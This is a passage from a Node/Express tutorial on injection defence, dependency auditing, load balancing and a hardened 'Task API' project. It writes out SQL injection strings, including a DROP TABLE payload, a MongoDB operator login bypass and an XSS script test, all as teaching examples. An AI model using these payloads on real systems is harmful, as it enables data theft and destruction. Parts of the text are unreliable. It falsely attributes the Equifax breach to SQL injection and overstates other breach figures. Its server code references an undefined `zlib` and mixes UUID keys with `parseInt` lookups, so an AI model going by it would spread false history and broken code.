**WHAT Is Injection?**

Attacker inserts malicious code into your queries, allowing them to read, modify, or delete any data.

**THE ATTACK:**

```javascript
// VULNERABLE CODE ❌
app.get('/api/users', (req, res) => {
  const name = req.query.name;
  const query = `SELECT * FROM users WHERE name = '${name}'`;
  db.query(query); // DANGER!
});

// Attacker sends: name = ' OR '1'='1
// Resulting query: SELECT * FROM users WHERE name = '' OR '1'='1'
// Result: Returns ALL users (bypasses WHERE clause)

// Attacker sends: name = '; DROP TABLE users; --
// Resulting query: SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
// Result: Your users table is deleted.
```

**THE DEFENSE (Parameterized Queries):**

```javascript
// ✅ SAFE: Parameterized query (pg)
app.get('/api/users', async (req, res) => {
  const name = req.query.name;
  const result = await db.query(
    'SELECT * FROM users WHERE name = $1',
    [name] // Parameters are escaped automatically
  );
  res.json(result.rows);
});

// ✅ SAFE: Sequelize/ORM
const users = await User.findAll({
  where: { name: req.query.name } // Automatically parameterized
});

// ✅ SAFE: Mongoose (MongoDB)
const users = await User.find({
  name: req.query.name // Not vulnerable to NoSQL injection
});
```

**NoSQL Injection (MongoDB):**

```javascript
// VULNERABLE ❌
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  const user = await User.findOne({
    username: username,
    password: password // If password is { "$ne": null }, MATCHES ANY USER!
  });
});

// Attacker sends: { "username": "admin", "password": { "$ne": null } }
// MongoDB query: { username: "admin", password: { $ne: null } }
// Result: Logs in as admin without knowing password!

// ✅ SAFE: Always validate inputs, use proper auth
const user = await User.findOne({ username: req.body.username });
if (!user || !await bcrypt.compare(req.body.password, user.passwordHash)) {
  return res.status(401).json({ error: 'Invalid credentials' });
}
```

**WHAT HAPPENS If You Skip Parameterized Queries:**

- **Equifax breach (2017)**: SQL injection in a dispute portal led to exposure of 143 million records.
- **Cisco breach (2018)**: SQL injection in a web management interface allowed remote code execution.
- **TalkTalk breach (2015)**: SQL injection exposed 157,000 customer records. Cost: £60 million.

---

### 6.6 Dependency Auditing: Why `left-pad` Matters

**WHAT Is Dependency Auditing?**

Checking your `node_modules` for known security vulnerabilities.

**The `left-pad` Incident (2016):**

A developer unpublished an 11-line package called `left-pad` from npm. Thousands of projects—including major ones like Babel and React—broke because they depended on it, directly or transitively.

**Lessons:**
1. Your app depends on 1000+ packages you didn't write.
2. Any one of them could be unpublished, compromised, or have vulnerabilities.
3. You must audit regularly.

**How to Audit:**

```bash
# Check for vulnerabilities
npm audit

# Fix automatically (updates to non-breaking versions)
npm audit fix

# Fix including breaking changes (test thoroughly!)
npm audit fix --force

# Output in JSON for CI pipelines
npm audit --json > audit-report.json

# Alternative: Snyk (more comprehensive)
npx snyk test
npx snyk monitor  # Continuous monitoring
```

**Setting Up Automated Auditing:**

```json
// package.json
{
  "scripts": {
    "test": "jest",
    "audit": "npm audit --audit-level=moderate",
    "prepush": "npm run audit && npm test"
  }
}
```

```yaml
# .github/workflows/security.yml
name: Security Audit
on: [push, pull_request]
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
      - run: npm ci
      - run: npm audit --audit-level=moderate
```

**WHAT HAPPENS If You Skip Auditing:**

- **event-stream (2018)**: Malicious code was added to a popular package, stealing Bitcoin from Copay wallets.
- **ua-parser-js (2021)**: Compromised versions installed cryptominers and password stealers.
- **colors.js (2022)**: Developer intentionally introduced an infinite loop in protest, breaking thousands of CI pipelines.

**LATEST BEST PRACTICE (2025)**:
- Use `npm ci` instead of `npm install` in CI (respects `package-lock.json`).
- Pin exact versions in `package.json` (no `^` or `~`).
- Use Dependabot or Renovate for automated update PRs.
- Consider `corepack` and `pnpm` for better dependency isolation.

---

## 7. Load Balancing Basics

### WHAT Is Load Balancing?

Distributing incoming traffic across multiple server instances to ensure no single server is overwhelmed.

### WHY You Need It

| Without LB | With LB |
|------------|---------|
| Single point of failure | Survives server crashes |
| Max capacity = 1 server | Capacity = N servers |
| Downtime for deployments | Rolling deployments (zero downtime) |
| No geo-distribution | Route users to nearest server |

### Types of Load Balancing

```
┌─────────────────────────────────────────────────────────┐
│                    LOAD BALANCER                         │
│  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐   │
│  │ Round   │  │ Least   │  │ IP Hash │  │ Weighted│   │
│  │ Robin   │  │ Conn    │  │         │  │ Round   │   │
│  └────┬────┘  └────┬────┘  └────┬────┘  └────┬────┘   │
│       └─────────────┴────────────┴─────────────┘        │
│                      Algorithm                           │
└─────────────────────────────────────────────────────────┘
```

| Algorithm | How It Works | Best For |
|-----------|-------------|----------|
| **Round Robin** | Each server in turn | Equal capacity servers |
| **Least Connections** | Server with fewest active connections | Long-lived connections (WebSockets) |
| **IP Hash** | Same client → same server | Session affinity |
| **Weighted Round Robin** | More powerful servers get more traffic | Mixed server sizes |
| **Random** | Random distribution | Simplicity, even distribution at scale |

### Express-Specific Consideration: State

```javascript
// PROBLEM: Sessions stored in memory
const sessions = new Map(); // ❌ Only exists on this server!

// User logs in on Server 1 → session stored there
// Next request goes to Server 2 → session not found → logged out

// SOLUTION: External session store
const session = require('express-session');
const RedisStore = require('connect-redis')(session);

app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false
}));
// Now all servers share sessions via Redis
```

### Simple NGINX Load Balancer Config

```nginx
upstream api_servers {
    least_conn;  # Least connections algorithm
    server 127.0.0.1:3001;
    server 127.0.0.1:3002;
    server 127.0.0.1:3003;
    server 127.0.0.1:3004 backup;  # Only if others fail
}

server {
    listen 80;
    
    location / {
        proxy_pass http://api_servers;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        
        # For WebSockets:
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
    }
}
```

---

## 8. The Cost of Getting It Wrong

### Performance Disasters

| Mistake | Consequence | Real Example |
|---------|-------------|--------------|
| No cache invalidation | Stale data, angry users | E-commerce site showed "in stock" for sold-out items |
| Unbounded cache | Memory exhaustion, OOM crash | Fintech platform down 4 hours during peak trading |
| Missing database index | 500ms queries, timeouts | Social app lost users because feed loaded in 8 seconds |
| N+1 queries | Database overload | Startup's DB bill went from $200 to $5,000/month |
| No connection pooling | Request timeouts | API crashed at 50 concurrent users |
| Compressing images | CPU waste, no benefit | Image server CPU at 90% with 0% bandwidth savings |
| No rate limiting | DDoS, data breach | Unprotected login brute-forced in 2 hours |

### Security Disasters

| Missing Protection | Attack | Impact |
|-------------------|--------|--------|
| No Helmet.js | Clickjacking | $50K stolen via iframe overlay |
| CORS `*` + credentials | CSRF | Unauthorized bank transfers |
| No XSS filtering | Stored XSS | 200M accounts compromised (Fortnite) |
| No SQL parameterization | SQL injection | 143M records exposed (Equifax) |
| No rate limiting | Credential stuffing | Thousands of accounts taken over |
| No dependency audits | Supply chain | Bitcoin stolen via malicious package |
| Missing HSTS | SSL downgrade | Man-in-the-middle attacks |

---

## 9. Mini Project: Fortify the Task API

### Project Overview

Take a basic Task API and add:
1. **Redis caching** with proper invalidation
2. **Rate limiting** (IP + user-based)
3. **Gzip compression**
4. **Helmet security headers**
5. **CORS configuration**
6. **XSS prevention**
7. **Input validation**

### Starting Point: Basic Task API

```javascript
const express = require('express');
const app = express();
app.use(express.json());

const tasks = [
  { id: 1, title: 'Learn caching', userId: 'user-1' },
  { id: 2, title: 'Learn security', userId: 'user-1' }
];

app.get('/api/tasks', (req, res) => {
  res.json(tasks);
});

app.get('/api/tasks/:id', (req, res) => {
  const task = tasks.find(t => t.id === parseInt(req.params.id));
  res.json(task);
});

app.post('/api/tasks', (req, res) => {
  const task = { id: Date.now(), ...req.body };
  tasks.push(task);
  res.status(201).json(task);
});

app.listen(3000);
```

### Step 1: Install Dependencies

```bash
npm install express helmet cors compression express-rate-limit \
  lru-cache ioredis dompurify jsdom bcryptjs jsonwebtoken \
  express-validator
```

### Step 2: The Fortified Server

```javascript
require('dotenv').config();
const express = require('express');
const helmet = require('helmet');
const cors = require('cors');
const compression = require('compression');
const rateLimit = require('express-rate-limit');
const Redis = require('ioredis');
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const { body, validationResult } = require('express-validator');
const LRU = require('lru-cache');
const crypto = require('crypto');

const app = express();
const redis = new Redis(process.env.REDIS_URL);
const DOMPurify = createDOMPurify(new JSDOM('').window);

// ============================================================
// 1. SECURITY HEADERS (Helmet)
// ============================================================
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      scriptSrc: ["'self'"]
    }
  },
  crossOriginResourcePolicy: { policy: 'same-origin' },
  hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
  permissionsPolicy: {
    features: {
      camera: [],
      microphone: [],
      geolocation: [],
      payment: []
    }
  }
}));

// Cross-Origin Embedder Policy (COEP)
app.use((req, res, next) => {
  res.setHeader('Cross-Origin-Embedder-Policy', 'require-corp');
  next();
});

// ============================================================
// 2. CORS (Restrictive)
// ============================================================
const allowedOrigins = [
  'http://localhost:5173',
  'https://app.example.com'
];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));

// ============================================================
// 3. REQUEST TIMEOUT (Prevent slowloris and long-running requests)
// ============================================================
app.use((req, res, next) => {
  req.setTimeout(30000, () => {
    res.status(408).json({ error: 'Request timeout' });
  });
  res.setTimeout(30000);
  next();
});

// ============================================================
// 4. COMPRESSION (Gzip + Brotli for dynamic content)
// ============================================================
app.use(compression({
  filter: (req, res) => {
    if (req.headers['x-no-compression']) return false;
    return compression.filter(req, res);
  },
  brotli: {
    enabled: true,
    zlib: {
      params: {
        [zlib.constants.BROTLI_PARAM_QUALITY]: 4,
      },
    },
  }
}));

// ============================================================
// 5. RATE LIMITING
// ============================================================
const generalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  standardHeaders: true,
  legacyHeaders: false
});

const strictLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5
});

app.use('/api/', generalLimiter);
app.use('/api/auth/', strictLimiter);

// ============================================================
// 6. IN-MEMORY LRU CACHE (Bounded!)
// ============================================================
const taskCache = new LRU({
  max: 1000,
  ttl: 1000 * 60 * 5 // 5 minutes
});

// ============================================================
// 7. INPUT VALIDATION
// ============================================================
const validateTask = [
  body('title').trim().isLength({ min: 1, max: 200 }).escape(),
  body('description').optional().trim().isLength({ max: 2000 }).escape(),
  body('status').optional().isIn(['pending', 'in-progress', 'done'])
];

// ============================================================
// DATA STORE (Mock database)
// ============================================================
const tasks = new Map();
tasks.set(1, { id: 1, title: 'Learn caching', userId: 'user-1', status: 'done' });
tasks.set(2, { id: 2, title: 'Learn security', userId: 'user-1', status: 'pending' });

// ============================================================
// CACHE HELPERS
// ============================================================
async function getCachedTask(taskId) {
  const cacheKey = `task:${taskId}`;
  
  // Check in-memory first
  const memCached = taskCache.get(cacheKey);
  if (memCached) return memCached;
  
  // Check Redis
  const redisCached = await redis.get(cacheKey);
  if (redisCached) {
    try {
      const parsed = JSON.parse(redisCached);
      taskCache.set(cacheKey, parsed); // Populate in-memory too
      return parsed;
    } catch (err) {
      await redis.del(cacheKey);
    }
  }
  
  // Database
  const task = tasks.get(parseInt(taskId));
  if (!task) return null;
  
  // Populate caches
  taskCache.set(cacheKey, task);
  await redis.setex(cacheKey, 300, JSON.stringify(task));
  
  return task;
}

async function invalidateTaskCaches(taskId, userId) {
  const cacheKey = `task:${taskId}`;
  taskCache.delete(cacheKey);
  await redis.del(cacheKey);
  await redis.del('tasks:list:all');
  await redis.del(`tasks:list:${userId}`);
}

// ============================================================
// ROUTES
// ============================================================

// GET /api/tasks - List with HTTP caching headers
app.get('/api/tasks', async (req, res) => {
  const userId = req.headers['x-user-id'] || 'anonymous';
  const cacheKey = `tasks:list:${userId}`;
  
  // Check Redis
  const cached = await redis.get(cacheKey);
  if (cached) {
    res.setHeader('X-Cache', 'HIT');
    res.setHeader('Cache-Control', 'private, max-age=60');
    return res.json(JSON.parse(cached));
  }
  
  // Filter tasks by user
  const userTasks = Array.from(tasks.values())
    .filter(t => t.userId === userId);
  
  // Store in Redis
  await redis.setex(cacheKey, 60, JSON.stringify(userTasks));
  
  res.setHeader('X-Cache', 'MISS');
  res.setHeader('Cache-Control', 'private, max-age=60');
  res.json(userTasks);
});

// GET /api/tasks/:id - Individual with ETag
app.get('/api/tasks/:id', async (req, res) => {
  const task = await getCachedTask(req.params.id);
  
  if (!task) {
    return res.status(404).json({ error: 'Task not found' });
  }
  
  // Generate ETag
  const etag = crypto.createHash('md5').update(JSON.stringify(task)).digest('hex');
  
  if (req.headers['if-none-match'] === etag) {
    return res.status(304).end();
  }
  
  res.setHeader('ETag', etag);
  res.setHeader('Cache-Control', 'private, max-age=300');
  res.json(task);
});

// POST /api/tasks - Create with validation and cache invalidation
app.post('/api/tasks', validateTask, async (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(422).json({ errors: errors.array() });
  }
  
  const userId = req.headers['x-user-id'] || 'anonymous';
  
  // Sanitize input (XSS prevention)
  const task = {
    id: crypto.randomUUID(),
    title: DOMPurify.sanitize(req.body.title),
    description: req.body.description 
      ? DOMPurify.sanitize(req.body.description) 
      : null,
    status: req.body.status || 'pending',
    userId,
    createdAt: new Date().toISOString()
  };
  
  tasks.set(task.id, task);
  
  // Invalidate list caches
  await invalidateTaskCaches(task.id, userId);
  
  res.status(201).json(task);
});

// PUT /api/tasks/:id - Update with cache invalidation
app.put('/api/tasks/:id', validateTask, async (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(422).json({ errors: errors.array() });
  }
  
  const existing = tasks.get(parseInt(req.params.id));
  if (!existing) {
    return res.status(404).json({ error: 'Task not found' });
  }
  
  const updated = {
    ...existing,
    title: DOMPurify.sanitize(req.body.title),
    description: req.body.description 
      ? DOMPurify.sanitize(req.body.description) 
      : existing.description,
    status: req.body.status || existing.status,
    updatedAt: new Date().toISOString()
  };
  
  tasks.set(updated.id, updated);
  await invalidateTaskCaches(updated.id, updated.userId);
  
  res.json(updated);
});

// DELETE /api/tasks/:id
app.delete('/api/tasks/:id', async (req, res) => {
  const task = tasks.get(parseInt(req.params.id));
  if (!task) {
    return res.status(404).json({ error: 'Task not found' });
  }
  
  tasks.delete(parseInt(req.params.id));
  await invalidateTaskCaches(task.id, task.userId);
  
  res.status(204).end();
});

// Health check
app.get('/health', (req, res) => {
  res.json({ 
    status: 'healthy', 
    timestamp: new Date().toISOString(),
    cacheSize: taskCache.size,
    redisConnected: redis.status === 'ready'
  });
});

// Global error handler
app.use((err, req, res, next) => {
  if (res.headersSent) {
    return next(err); // Delegate to default Express error handler
  }
  console.error(err.stack);
  res.status(err.status || 500).json({
    error: process.env.NODE_ENV === 'production' 
      ? 'Internal server error' 
      : err.message
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🛡️  Fortified Task API running on port ${PORT}`);
  console.log('Features: Helmet, CORS, Compression, Rate Limiting, Redis Cache, Validation');
});
```

### Testing Your Fortified API

```bash
# 1. Test caching
curl -i http://localhost:3000/api/tasks -H "X-User-Id: user-1"
# Observe: X-Cache: MISS

curl -i http://localhost:3000/api/tasks -H "X-User-Id: user-1"
# Observe: X-Cache: HIT

# 2. Test rate limiting
for i in {1..105}; do
  curl -s http://localhost:3000/api/tasks > /dev/null
done
# Observe: 429 Too Many Requests

# 3. Test security headers
curl -I http://localhost:3000/api/tasks
# Observe: X-Content-Type-Options, X-Frame-Options, etc.

# 4. Test XSS prevention
curl -X POST http://localhost:3000/api/tasks \
  -H "Content-Type: application/json" \
  -H "X-User-Id: user-1" \
  -d '{"title": "<script>alert(1)</script>"}'
# Observe: Title is sanitized to remove script tag

# 5. Test validation
curl -X POST http://localhost:3000/api/tasks \
  -H "Content-Type: application/json" \
  -H "X-User-Id: user-1" \
  -d '{"title": ""}'
# Observe: 422 Unprocessable Entity
```

### Extension Challenges

1. **Add database**: Replace in-memory Map with PostgreSQL/MongoDB.
2. **Add authentication**: JWT middleware instead of `X-User-Id` header.
3. **Add pagination**: Cursor-based pagination for `/api/tasks`.
4. **Add search**: Full-text search with proper indexing.
5. **Add metrics**: Track cache hit rate, response times, error rates.
6. **Add circuit breaker**: Fail fast when Redis is down.

---

## 10. Summary & Quick Reference

### Performance Checklist

| Layer | Action | Tool/Package |
|-------|--------|--------------|
| **Application** | Profile before optimizing | `clinic.js`, `0x` |
| **In-memory cache** | Use bounded LRU cache | `lru-cache` |
| **Distributed cache** | Cache-aside with Redis | `ioredis` |
| **HTTP cache** | Set proper Cache-Control | Built-in headers |
| **Database** | Index query columns | `CREATE INDEX` |
| **Database** | Avoid N+1 queries | JOIN, DataLoader |
| **Database** | Use connection pooling | Sequelize/Pool config |
| **Rate limiting** | IP + user-based limits | `express-rate-limit` |
| **Compression** | Gzip dynamic, Brotli static | `compression` |

### Security Checklist

| Layer | Action | Tool/Package |
|-------|--------|--------------|
| **Headers** | Set security headers | `helmet` |
| **CORS** | Whitelist origins, never `*` + credentials | `cors` |
| **XSS** | Sanitize all user input | `dompurify` |
| **CSRF** | Token validation for cookie auth | `csurf` |
| **Injection** | Parameterized queries only | ORM/Prepared statements |
| **Rate limit** | Protect auth endpoints | `express-rate-limit` |
| **Dependencies** | Audit weekly | `npm audit`, Snyk |
| **HTTPS** | Force TLS in production | `helmet.hsts()` |

### The Golden Rules

1. **Cache with TTL always**: Unbounded caches become memory leaks.
2. **Invalidate on write**: Stale data is a bug, not a feature.
3. **Measure first**: Don't optimize what you haven't profiled.
4. **Rate limit everything**: If it's exposed to the internet, it will be attacked.
5. **Never trust input**: Sanitize, validate, parameterize.
6. **Security headers are free**: Helmet takes one line. Use it.
7. **Dependencies are liabilities**: Audit them like your own code.
8. **Compression has rules**: Don't compress the incompressible.

---

> **Final Thought**: Performance and security are not features you add at the end. They're architectural decisions you make from day one. A fast, insecure app will be breached. A slow, secure app will be abandoned. Build both. Build well.
